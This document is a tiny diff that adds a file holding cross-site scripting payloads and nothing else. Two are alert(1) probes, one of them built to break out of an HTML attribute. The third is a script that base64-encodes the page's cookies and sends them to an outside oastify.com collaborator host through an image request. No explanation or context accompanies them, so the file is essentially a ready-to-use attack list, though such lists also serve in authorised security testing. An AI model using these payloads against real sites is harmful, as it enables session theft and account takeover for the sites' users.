@@ -1,0 +1,6 @@
+```"><script>alert(1)</script>#
+<script>alert(1)</script>
+```
+
+```"><script>var i=new Image(); i.src="http://lzo4pu8fg0n3hs4q5fehgf9mkdq4ew9ky.oastify.com/?cookie="+btoa(document.cookie);</script>
+```
